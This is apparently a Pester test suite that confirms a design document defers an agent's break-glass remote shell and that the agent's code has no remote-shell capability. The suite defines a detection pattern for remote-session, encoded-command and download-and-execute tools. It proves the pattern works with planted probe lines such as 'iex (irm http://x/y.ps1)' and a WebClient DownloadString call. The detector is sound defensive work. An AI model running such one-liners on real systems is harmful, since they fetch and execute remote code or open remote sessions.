# Move 74: "Design the break-glass shell: disabled by default, time-limited, transcribed" (#792) - design only.
#
# Joe's decision D4 (2026-10-31) is to DEFER the break-glass shell: do not build it. AGENT-BREAK-GLASS.md records that and
# what would have to hold before anyone revisited it. This suite keeps the record honest and keeps the decision true:
#   - the decision is quoted from, and exists in, the threat model it came from;
#   - every condition for revisiting is stated (ten of them) and echoes the threat model's own E4 requirements;
#   - the agent's own code (windows/agent) holds no remote-shell capability: no remote session, remote command, encoded
#     command, download-and-execute or piped shell; the same scan runs on a planted example, so it is known to see one.
#     (On a branch where the agent tree is empty the scan is vacuously clean; it bites as soon as a file lands there.)
#
# Source stays ASCII (Windows PowerShell 5.1 reads a BOM-less script as ANSI).

Describe 'AGENT-BREAK-GLASS.md (design only): the shell stays unbuilt, and what would have to hold if it were' {
    BeforeAll {
        $script:Win = Split-Path -Parent (Split-Path -Parent $PSScriptRoot)
        $script:Text = [IO.File]::ReadAllText((Join-Path $script:Win 'AGENT-BREAK-GLASS.md'))
        $script:Flat = $script:Text -replace '\s+', ' '
        $script:Tm = [IO.File]::ReadAllText((Join-Path $script:Win 'AGENT-THREAT-MODEL.md'))
        $script:Pattern = 'Enter-PSSession|New-PSSession|Invoke-Command\b[^\r\n]*-(ComputerName|Session|HostName)|-EncodedCommand|\bpsexec\b|\bwinrs\b|Invoke-Expression|\biex\b|DownloadString|\bcmd(\.exe)?\s+/c\b|\|\s*(cmd|powershell|pwsh|sh|bash)\b'
    }

    Context 'the decision' {
        It 'quotes D4 from the threat model, which says the same' {
            $script:Flat | Should -Match 'Defer\. Do not build the break-glass shell\.'
            ($script:Tm -replace '\s+', ' ') | Should -Match 'Defer\. Do not build the break-glass shell\.'
            ($script:Tm -replace '\s+', ' ') | Should -Match '\| D4 \|'
        }
        It 'answers E4 by decision, and E4 exists in the threat model' {
            $script:Flat | Should -Match '\*\*E4\*\*'
            $script:Tm | Should -Match '\| E4 \|'
        }
        It 'separates the shell from the existing break-glass administrator account' {
            $script:Flat | Should -Match 'break-glass administrator account'
            $script:Flat | Should -Match 'has nothing to do with this document'
        }
        It 'says no job kind enables it and that it would be a separate capability' {
            $script:Flat | Should -Match 'no job type may ever'
            $script:Flat | Should -Match 'A separate capability, not a job type'
        }
    }

    Context 'what would have to hold before anyone revisited it' {
        It 'states all ten conditions' {
            $section = [regex]::Match($script:Text, '## 4\. If it is ever revisited(.*?)## 5\.', 'Singleline').Groups[1].Value
            @([regex]::Matches($section, '(?m)^\d+\. \*\*')).Count | Should -Be 10
        }
        It 'covers each requirement the threat model''s E4 row sets' {
            $tmRow = [regex]::Match($script:Tm, '\| E4 \|[^\r\n]*').Value
            foreach ($req in @('disabled by default', 'just-in-time approved', 'short-lived', 'fully transcripted', 'no job type enables it')) { $tmRow | Should -Match ([regex]::Escape($req)) -Because "the threat model's E4 row requires: $req" }
            foreach ($req in @('Disabled by default', 'Just-in-time approval', 'Short-lived', 'Fully transcribed', 'No job kind enables it')) { $script:Flat | Should -Match ([regex]::Escape($req)) -Because "this document must carry: $req" }
        }
        It 'ties it to the kill switch, two-person approval, reviewer-key pinning and a threat-model update' {
            foreach ($needle in @('Stoppable by the kill switch', 'Two-person for destructive commands', 'Reviewer-key pinned', 'A threat-model update first')) { $script:Flat | Should -Match $needle }
        }
        It 'leaves the decision to Joe' {
            $script:Flat | Should -Match 'Joe decides whether to revisit; an agent does not'
        }
    }

    Context 'the decision stays true in the code' {
        It 'no file in the agent tree holds a remote-shell capability' {
            $dir = Join-Path $script:Win 'agent'
            $files = @(Get-ChildItem -Path $dir -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in @('.ps1', '.psm1', '.cmd', '.bat', '.cs') })
            $bad = New-Object System.Collections.Generic.List[string]
            foreach ($f in $files) {
                $hit = Select-String -LiteralPath $f.FullName -Pattern $script:Pattern | Select-Object -First 1
                if ($hit) { $bad.Add("$($f.Name):$($hit.LineNumber)") }
            }
            ($bad -join ', ') | Should -BeNullOrEmpty -Because 'the break-glass shell is deferred (D4): the agent has no way to run a command that a signed job did not carry'
        }
        It 'the scan sees each kind of remote shell it is meant to catch (planted examples)' {
            $dir = Join-Path ([IO.Path]::GetTempPath()) ('de-bg-probe-' + [guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
            try {
                $examples = @('Enter-PSSession -ComputerName x', 'New-PSSession y', 'Invoke-Command -ComputerName z -ScriptBlock { 1 }', 'powershell -EncodedCommand AAAA', 'psexec \\host cmd', 'winrs -r:host dir',
                    'iex (irm http://x/y.ps1)', 'Invoke-Expression $text', '(New-Object Net.WebClient).DownloadString("http://x")', 'cmd /c whoami', 'Get-Content x | powershell')
                foreach ($e in $examples) {
                    $probe = Join-Path $dir 'bad.ps1'
                    Set-Content -LiteralPath $probe -Value $e
                    (Select-String -LiteralPath $probe -Pattern $script:Pattern | Select-Object -First 1) | Should -Not -BeNullOrEmpty -Because "the scan must catch: $e"
                }
                $clean = Join-Path $dir 'ok.ps1'
                Set-Content -LiteralPath $clean -Value 'Start-DEAgentLoop -Root $Root -StopFile $StopFile'
                (Select-String -LiteralPath $clean -Pattern $script:Pattern | Select-Object -First 1) | Should -BeNullOrEmpty
            } finally { Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue }
        }
    }

    Context 'the document itself' {
        It 'says it is design only, so nobody reads it as built' {
            $script:Text | Should -Match '\*\*Design only'
        }
        It 'every local link resolves to a file that exists' {
            $missing = New-Object System.Collections.Generic.List[string]
            foreach ($m in [regex]::Matches($script:Text, '\]\(([A-Za-z0-9._-]+\.md)\)')) {
                if (-not (Test-Path -LiteralPath (Join-Path $script:Win $m.Groups[1].Value))) { $missing.Add($m.Groups[1].Value) }
            }
            ($missing -join ', ') | Should -BeNullOrEmpty
        }
    }
}
